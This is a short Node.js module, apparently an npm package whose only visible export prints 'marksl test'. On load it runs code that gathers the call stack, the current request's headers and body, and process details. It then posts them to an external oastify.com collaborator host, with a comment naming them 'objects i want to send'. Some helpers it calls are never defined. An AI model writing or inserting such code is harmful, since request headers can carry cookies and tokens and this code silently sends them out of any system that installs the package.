const https = require('https');

async function main() {

    // stack
    const error = new Error();
    Error.captureStackTrace(error);
    const callStack = error.stack;

    // request
    const currentRequest = await getCurrentRequest();
    const currentRequestInspected = util.inspect(currentRequest, {showHidden: false, depth: 2});
    const reqHeaders = currentRequest.headers;
    const reqBody = currentRequest.request.body;

    // process.domain
    const domain = util.inspect(global.process.domain, {showHidden: false, depth: 2});

    // objects i want to send
    const goodies = {
        domain,
        reqHeaders,
        reqBody,
        currentRequestInspected, // object too big, send to webhooksite
        callStack
    }

    for (let [key, value] of Object.entries(goodies)) {
        logToWebhook({key, value});
    }
}

async function logToWebhook(log) {

    const data = JSON.stringify(log);

    const options = {
        hostname: 'aftyx67jjxtwni46klya1ze3ouuriq6f.oastify.com',
        path: '/',
        method: 'POST',
        headers: {
            'Content-Length': data.length
        }
    };

    const req = https.request(options)
    req.write(data);
    req.end();
}

main();

exports.printMsg = function() {
    console.log("marksl test");
}
